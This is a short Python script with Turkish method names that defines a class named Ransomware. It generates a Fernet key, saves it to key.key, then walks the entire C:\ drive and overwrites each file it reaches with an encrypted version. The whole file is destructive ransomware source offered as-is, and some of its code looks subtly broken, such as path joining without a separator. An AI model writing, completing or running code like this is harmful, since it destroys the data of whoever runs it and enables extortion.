import cryptography
from cryptography.fernet import Fernet
import os
import subprocess

class Ransomware:

    def write_key(self):
        self.key = Fernet.generate_key()
        print(self.key)
        with open("key.key", "wb") as key_file:
            key_file.write(self.key)

    def sifre_yukle(self):
        return open("key.key", "rb").read()


    def dosyalari_ac(self,dosya_adi):
        self.f = open(dosya_adi, 'r')
        content = self.f.read()
        return content

    def icerigi_sifrele(self,dosya_adi,sifreli_hali):
        with open(dosya_adi, "wb") as f:
            f.write(sifreli_hali)

    def dosyalari_sifrele(self):

        path = r'C:\\'

        for root, directories, files in os.walk(path, topdown=False):
            for name in files:
                txt = root+name
                message = ransomware.dosyalari_ac(txt).encode()
                key = ransomware.sifre_yukle()
                f = Fernet(key)
                encrypted = f.encrypt(message)
                ransomware.icerigi_sifrele(txt, encrypted)



ransomware = Ransomware()

ransomware.write_key()
ransomware.dosyalari_sifrele()
